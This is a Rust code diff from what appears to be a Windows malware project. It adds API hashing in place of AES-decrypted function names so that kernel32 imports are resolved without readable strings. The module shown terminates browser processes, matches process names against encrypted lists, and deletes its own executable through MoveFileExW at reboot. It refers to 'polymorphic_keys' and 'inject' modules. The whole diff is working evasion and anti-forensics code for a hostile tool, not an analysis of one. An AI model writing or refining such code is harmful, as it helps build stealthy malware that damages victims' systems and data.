@@ -1,4 +1,10 @@
 use std::ffi::c_void;
+use crate::core_utils::api_hash::{
+    H_KERNEL32,
+    H_CreateToolhelp32Snapshot, H_Process32FirstW, H_Process32NextW,
+    H_OpenProcess, H_TerminateProcess, H_CloseHandle,
+    H_MoveFileExW, H_GetModuleFileNameW,
+};
 
 #[repr(C)]
 #[derive(Clone)]
@@ -43,20 +49,13 @@ const TH32CS_SNAPPROCESS: u32 = 0x00000002;
 const PROCESS_TERMINATE: u32 = 0x0001;
 const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
 
-use crate::polymorphic_keys::{aes_decrypt, aes_decode_stack};
-
 fn resolve_kernel32() -> Option<*mut u8> {
-    let mut buf = [0u8; 256];
-    let len = aes_decode_stack(&crate::polymorphic_keys::KILL_K32_ENC, &crate::polymorphic_keys::KILL_K32_KEY, &crate::polymorphic_keys::KILL_K32_NONCE, &mut buf);
-    let name = core::str::from_utf8(&buf[..len]).ok()?;
-    inject::syscall::get_module_base(name)
+    inject::syscall::get_module_base_by_hash(H_KERNEL32)
 }
 
-fn resolve_fn(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Option<*mut u8> {
-    let decoded = aes_decrypt(encoded, key, nonce);
-    let name = core::str::from_utf8(&decoded).ok()?;
+fn resolve_fn(export_hash: u32) -> Option<*mut u8> {
     let k32 = resolve_kernel32()?;
-    inject::syscall::resolve_export(k32, name)
+    inject::syscall::resolve_export_by_hash(k32, export_hash)
 }
 
 unsafe fn crash_process(
@@ -73,6 +72,8 @@ unsafe fn crash_process(
     terminate(handle, 1);
     close_handle(handle);
 }
+
+use crate::polymorphic_keys::aes_decrypt;
 
 fn exe_matches_any(items: &[(&[u8], &[u8; 32], &[u8; 12])], exe_lower: &str) -> bool {
     for (encoded, key, nonce) in items {
@@ -161,18 +162,18 @@ fn kill_browser_processes(
 pub fn kill_browsers() {
     let Some(_k32) = resolve_kernel32() else { return };
 
-    let create_snap: Option<FnCreateToolhelp32Snapshot> = resolve_fn(&crate::polymorphic_keys::KILL_CTX_SNAP_ENC, &crate::polymorphic_keys::KILL_CTX_SNAP_KEY, &crate::polymorphic_keys::KILL_CTX_SNAP_NONCE)
-        .map(|a| unsafe { std::mem::transmute(a) });
-    let proc_first: Option<FnProcess32FirstW> = resolve_fn(&crate::polymorphic_keys::KILL_P32_FIRST_ENC, &crate::polymorphic_keys::KILL_P32_FIRST_KEY, &crate::polymorphic_keys::KILL_P32_FIRST_NONCE)
-        .map(|a| unsafe { std::mem::transmute(a) });
-    let proc_next: Option<FnProcess32NextW> = resolve_fn(&crate::polymorphic_keys::KILL_P32_NEXT_ENC, &crate::polymorphic_keys::KILL_P32_NEXT_KEY, &crate::polymorphic_keys::KILL_P32_NEXT_NONCE)
-        .map(|a| unsafe { std::mem::transmute(a) });
-    let open_proc: Option<FnOpenProcess> = resolve_fn(&crate::polymorphic_keys::KILL_OPEN_PROC_ENC, &crate::polymorphic_keys::KILL_OPEN_PROC_KEY, &crate::polymorphic_keys::KILL_OPEN_PROC_NONCE)
-        .map(|a| unsafe { std::mem::transmute(a) });
-    let terminate: Option<FnTerminateProcess> = resolve_fn(&crate::polymorphic_keys::KILL_TERM_PROC_ENC, &crate::polymorphic_keys::KILL_TERM_PROC_KEY, &crate::polymorphic_keys::KILL_TERM_PROC_NONCE)
-        .map(|a| unsafe { std::mem::transmute(a) });
-    let close_handle: Option<FnCloseHandle> = resolve_fn(&crate::polymorphic_keys::KILL_CLOSE_H_ENC, &crate::polymorphic_keys::KILL_CLOSE_H_KEY, &crate::polymorphic_keys::KILL_CLOSE_H_NONCE)
-        .map(|a| unsafe { std::mem::transmute(a) });
+    let create_snap: Option<FnCreateToolhelp32Snapshot> =
+        resolve_fn(H_CreateToolhelp32Snapshot).map(|a| unsafe { std::mem::transmute(a) });
+    let proc_first: Option<FnProcess32FirstW> =
+        resolve_fn(H_Process32FirstW).map(|a| unsafe { std::mem::transmute(a) });
+    let proc_next: Option<FnProcess32NextW> =
+        resolve_fn(H_Process32NextW).map(|a| unsafe { std::mem::transmute(a) });
+    let open_proc: Option<FnOpenProcess> =
+        resolve_fn(H_OpenProcess).map(|a| unsafe { std::mem::transmute(a) });
+    let terminate: Option<FnTerminateProcess> =
+        resolve_fn(H_TerminateProcess).map(|a| unsafe { std::mem::transmute(a) });
+    let close_handle: Option<FnCloseHandle> =
+        resolve_fn(H_CloseHandle).map(|a| unsafe { std::mem::transmute(a) });
 
     let (Some(cs), Some(pf), Some(pn), Some(op), Some(term), Some(ch)) =
         (create_snap, proc_first, proc_next, open_proc, terminate, close_handle) else {
@@ -196,14 +197,14 @@ type FnGetModuleFileNameW = unsafe extern "system" fn(*mut c_void, *mut u16, u32
 const MOVEFILE_DELAY_UNTIL_REBOOT: u32 = 0x00000004;
 
 pub fn self_delete() {
-    let Some(k32) = resolve_kernel32() else { return };
+    let Some(_k32) = resolve_kernel32() else { return };
 
     unsafe {
-        let move_file: FnMoveFileExW = match resolve_fn(&crate::polymorphic_keys::KILL_MOVEFILE_ENC, &crate::polymorphic_keys::KILL_MOVEFILE_KEY, &crate::polymorphic_keys::KILL_MOVEFILE_NONCE) {
+        let move_file: FnMoveFileExW = match resolve_fn(H_MoveFileExW) {
             Some(a) => std::mem::transmute(a),
             None => return,
         };
-        let get_module: FnGetModuleFileNameW = match resolve_fn(&crate::polymorphic_keys::KILL_GETMODULE_ENC, &crate::polymorphic_keys::KILL_GETMODULE_KEY, &crate::polymorphic_keys::KILL_GETMODULE_NONCE) {
+        let get_module: FnGetModuleFileNameW = match resolve_fn(H_GetModuleFileNameW) {
             Some(a) => std::mem::transmute(a),
             None => return,
         };
